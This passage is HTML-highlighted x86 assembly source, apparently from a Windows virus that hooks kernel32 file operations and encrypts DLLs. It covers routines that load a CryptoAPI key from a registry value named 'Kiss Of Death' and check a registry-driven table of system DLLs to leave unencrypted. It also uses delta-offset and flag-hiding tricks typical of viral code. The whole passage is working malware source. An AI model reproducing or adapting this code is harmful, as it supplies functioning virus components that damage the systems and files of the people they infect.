        </span><span class="sc1">;  * read SIMPLE key from "Kiss Of Death"</span><span class="sc0">
        </span><span class="sc1">;  * get CSP and import SIMPLE key by WinAPI functions</span><span class="sc0">
        </span><span class="sc1">;  * close register handle, return ImportedKey handle</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;  input:   none</span><span class="sc0">
        </span><span class="sc1">;  output:  EAX ... imported key (if error, EAX=0)</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">__clk_regHan</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;register handle</span><span class="sc0">
        </span><span class="sc5">__clk_regFlag</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;register flags</span><span class="sc0">
        </span><span class="sc5">__clk_memory</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;key's memory place</span><span class="sc0">
        </span><span class="sc5">__clk_sim_len</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;simple key length</span><span class="sc0">
        </span><span class="sc5">__clk_provider</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;CSP provider</span><span class="sc0">
        </span><span class="sc5">__clk_hKey</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;imported key</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">crypt_loadKey</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; don't call this function once again in actual time</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_thread</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">

        </span><span class="sc1">; get delta offset</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_base_ebp</span><span class="sc0">

        </span><span class="sc1">; has key been loaded ?</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_loadKey</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__clk_finish</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__clk_hKey</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; open register folder</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__clk_regHan</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">80000001h</span><span class="sc0">       </span><span class="sc1">;HKEY_CURRENT_USER</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_Register</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__regOpen</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__clk_finish</span><span class="sc0">

        </span><span class="sc1">; allocate memory for SIMPLE key</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000100h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__clk_memory</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; load "Kiss Of Death" item, it is SIMPLE key...</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__clk_sim_len</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">00000100h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;address of data buffer size</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__clk_memory</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;address of data buffer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000003h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__clk_regFlag</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;REG_BINARY flag</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;reserved</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_RegFlag</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;name of value</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__clk_regHan</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddRegQueryValueExA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__clk_close_key</span><span class="sc0">

        </span><span class="sc1">; get CPS provider handle</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;Flags</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000001h</span><span class="sc0">       </span><span class="sc1">;PROV_RSA_FULL</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;provider name</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_KeyName</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;my special key</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__clk_provider</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;CSP provider</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddCryptAcquireContextA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;does key exist ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__clk_close_key</span><span class="sc0">

        </span><span class="sc1">; import SIMPLE key</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__clk_hKey</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;imported key</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;flags</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__clk_sim_len</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;length of SIMPLE key</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__clk_memory</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;SIMPLE key</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__clk_provider</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddCryptImportKey</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc5">__clk_close_key</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__clk_regHan</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddRegCloseKey</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">__clk_dealloc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__clk_memory</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mdealloc</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_loadKey</span><span class="sc4">],</span><span class="sc12">'!A92'</span><span class="sc0">

    </span><span class="sc5">__clk_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__clk_hKey</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;imported key (0=error)</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ct_finish</span><span class="sc0">     </span><span class="sc1">;back to thread</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ do NOT crypted DLL checking - name check and registry ÃÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function checks whether DLL come under to  the avoid</span><span class="sc0">
        </span><span class="sc1">;table. Heh, what does it mean ? Why some  DLLs can NOT be</span><span class="sc0">
        </span><span class="sc1">;crypted ? Well, I hook all file  operations from kernel32</span><span class="sc0">
        </span><span class="sc1">;memory when I'll be actived but till then system 'll open</span><span class="sc0">
        </span><span class="sc1">;some libraries like KERNEL32.DLL, USER32.DLL ... and then</span><span class="sc0">
        </span><span class="sc1">;it is my turn to hook, to check. This is that problem.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">__cdc_regHandle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;register handle</span><span class="sc0">
        </span><span class="sc5">__cdc_valuesLen</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;MaxValueLen</span><span class="sc0">
        </span><span class="sc5">__cdc_values</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;number of values</span><span class="sc0">
        </span><span class="sc5">__cdc_buffSize</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;buffer size</span><span class="sc0">
        </span><span class="sc5">__cdc_nRegistry</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;number of r. classes</span><span class="sc0">
        </span><span class="sc5">__cdc_memory</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;namez</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;  input:   EBX ... filename</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">crypt_DLL_check</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; save all registers</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc1">; check from our table</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_unFiles</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">validate_name</span><span class="sc0">       </span><span class="sc1">;is it do NOT crypt file ?</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__cdc_failed</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cdc_nRegistry</span><span class="sc4">],</span><span class="sc0"> \
            </span><span class="sc4">(</span><span class="sc5">crypto_unReg_E</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">crypto_unReg</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

        </span><span class="sc1">; open registry key</span><span class="sc0">
    </span><span class="sc5">__cdc_next_class</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cdc_regHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">80000002h</span><span class="sc0">       </span><span class="sc1">;HKEY_LOCAL_MACHINE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cdc_nRegistry</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_unReg</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__regOpen</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__cdc_finish</span><span class="sc0">        </span><span class="sc1">;failed ?</span><span class="sc0">

        </span><span class="sc1">; read number of values</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;LWriteTime, SecDescriptor</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cdc_valuesLen</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;MaxValueLen, MaxValueNameLen</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cdc_values</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cdc_regHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddRegQueryInfoKeyA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;failed ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__cdc_regClose</span><span class="sc0">

        </span><span class="sc1">; allocate memory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cdc_values</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cdc_valuesLen</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cdc_buffSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;double zero char</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cdc_memory</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; read all namez</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cdc_memory</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;pointer to store value name</span><span class="sc0">
    </span><span class="sc5">__cdc_repeat</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000005h</span><span class="sc0">       </span><span class="sc1">;five layers</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cdc_values</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;next value index</span><span class="sc0">
    </span><span class="sc5">__cdc_once_again</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cdc_valuesLen</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;length of value name</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;buffer's size</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;value name buffer</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;type of value entry</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;reserved</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">9</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;cbValueName</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;value name</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cdc_values</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;index of value to retrieve</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cdc_regHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddRegEnumValueA</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;read index entry</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">000000EAh</span><span class="sc0">       </span><span class="sc1">;ERROR_MORE_DATA</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__cdc_check_next</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__cdc_once_again</span><span class="sc0">    </span><span class="sc1">;try to read that once again</span><span class="sc0">
       </span><span class="sc5">__cdc_check_next</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cdc_valuesLen</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;number of characters</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;filename</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddCharUpperBuffA</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;convert to uppercase</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cdc_valuesLen</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;next entry in memory buf</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cdc_values</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__cdc_repeat</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">  </span><span class="sc1">;end char status</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cdc_memory</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;avoid table</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">validate_name</span><span class="sc0">       </span><span class="sc1">;EBX is filled</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">               </span><span class="sc1">;ehm :)</span><span class="sc0">

        </span><span class="sc1">; close register class</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cdc_regHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddRegCloseKey</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; deallocate memory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cdc_memory</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mdealloc</span><span class="sc0">

        </span><span class="sc1">; next register key</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">                </span><span class="sc1">;ehm :)</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__cdc_failed</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cdc_nRegistry</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__cdc_finish</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cdc_nRegistry</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__cdc_next_class</span><span class="sc0">

        </span><span class="sc1">; restore all registers</span><span class="sc0">
    </span><span class="sc5">__cdc_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F9h</span><span class="sc0">         </span><span class="sc1">;hidden STC instruction</span><span class="sc0">
    </span><span class="sc5">__cdc_failed</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc1">; close register class</span><span class="sc0">
    </span><span class="sc5">__cdc_regClose</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cdc_regHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddRegCloseKey</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__cdc_finish</span><span class="sc0">

